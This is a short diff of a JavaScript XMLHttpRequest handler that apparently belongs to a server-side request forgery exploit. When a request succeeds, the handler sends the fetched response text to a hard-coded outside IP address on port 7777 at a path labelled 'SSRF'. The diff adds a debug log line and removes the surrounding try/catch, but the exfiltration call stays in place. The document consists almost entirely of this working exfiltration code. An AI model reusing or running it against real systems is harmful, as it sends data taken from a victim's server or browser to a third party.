@@ -1,16 +1,17 @@
 
 function handler() {
   console.log(1);
+  console.log(this);
   if(this.status == 200 && this.responseText != null) {
     // success!
       //do whatever you want
       
       //xhr2.onreadystatechange = none; 
-      try{
+
       var xhr2 = new XMLHttpRequest();
       xhr2.open("GET", 'http://192.241.169.35:7777/SSRF?u='+encodeURIComponent(this.responseText), true);
       xhr2.send();
-      } catch(err){ console.log(err)}
+   
 
   } else {
     // something went wrong
